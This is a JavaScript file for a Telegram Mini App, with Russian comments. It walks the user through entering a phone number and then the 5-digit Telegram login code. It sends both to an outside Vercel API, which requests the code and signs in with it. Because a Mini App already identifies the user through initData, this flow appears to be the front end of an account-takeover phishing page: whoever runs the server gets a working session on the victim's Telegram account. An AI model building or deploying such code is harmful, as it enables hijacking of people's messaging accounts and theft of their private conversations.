const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const API_BASE = "https://telegram-api-ashen.vercel.app/api";

let currentPhone = "";
let phoneCodeHash = "";

const phoneInput = document.getElementById("phone");
const btnNext = document.getElementById("btn-next");
const phoneDisplay = document.getElementById("phone-display");
const codeInputs = document.querySelectorAll(".code-input");
const btnSubmit = document.getElementById("btn-submit");

let code = "";

function showStep(id) {
  document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

// Автоформатирование номера телефона
phoneInput.addEventListener("input", function(e) {
  let value = this.value.replace(/\D/g, "");
  if (!value.startsWith("+")) {
    value = "+" + value;
  }
  this.value = value;
});

codeInputs.forEach((input, idx) => {
  input.addEventListener("input", e => {
    const val = e.target.value.replace(/\D/, "");
    e.target.value = val;
    if (val && idx < 4) {
      codeInputs[idx + 1].focus();
    }
    code = Array.from(codeInputs).map(i => i.value).join("");
    btnSubmit.disabled = code.length !== 5;
  });

  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && idx > 0) {
      codeInputs[idx - 1].focus();
    }
  });
});

btnNext.onclick = async () => {
  const phone = phoneInput.value.trim();
  if (!phone.startsWith("+") || phone.length < 10) {
    alert("Введите корректный номер телефона");
    return;
  }

  currentPhone = phone;
  phoneDisplay.textContent = phone;
  showStep("loading");

  try {
    const response = await fetch(`${API_BASE}/request_code`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Telegram-Web-App-InitData": tg.initData
      },
      body: JSON.stringify({ phone })
    });

    const data = await response.json();
    
    if (data.ok) {
      phoneCodeHash = data.phone_code_hash;
      showStep("step-code");
      codeInputs[0].focus();
      codeInputs.forEach(input => input.value = "");
      code = "";
      btnSubmit.disabled = true;
    } else {
      alert(data.error || "Не удалось отправить код");
      showStep("step-phone");
    }
  } catch (err) {
    console.error(err);
    alert("Ошибка сети. Проверьте подключение к интернету");
    showStep("step-phone");
  }
};

btnSubmit.onclick = async () => {
  if (code.length !== 5) {
    alert("Введите полный 5-значный код");
    return;
  }

  showStep("loading");

  try {
    const response = await fetch(`${API_BASE}/sign_in`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Telegram-Web-App-InitData": tg.initData
      },
      body: JSON.stringify({
        phone: currentPhone,
        code: code,
        phone_code_hash: phoneCodeHash
      })
    });

    const data = await response.json();

    if (data.ok) {
      showStep("success");
      console.log("Успешный вход:", data.user);
      
      // Отправляем данные в WebApp
      if (tg.sendData) {
        tg.sendData(JSON.stringify({
          action: "auth_success",
          user: data.user
        }));
      }
      
      // Закрываем WebApp через 2 секунды
      setTimeout(() => {
        if (tg.close) tg.close();
      }, 2000);
    } else {
      alert(data.error || "Ошибка входа. Проверьте код и попробуйте снова");
      showStep("step-code");
      codeInputs.forEach(input => input.value = "");
      code = "";
      btnSubmit.disabled = true;
      codeInputs[0].focus();
    }
  } catch (err) {
    console.error(err);
    alert("Ошибка сети. Проверьте подключение к интернету");
    showStep("step-code");
  }
};

// Инициализация
showStep("step-phone");
phoneInput.focus();

// Обработка нажатия Enter в поле телефона
phoneInput.addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    btnNext.click();
  }
});

// Обработка нажатия Enter в поле кода
codeInputs.forEach((input, idx) => {
  input.addEventListener("keypress", (e) => {
    if (e.key === "Enter" && idx === 4 && code.length === 5) {
      btnSubmit.click();
    }
  });
});
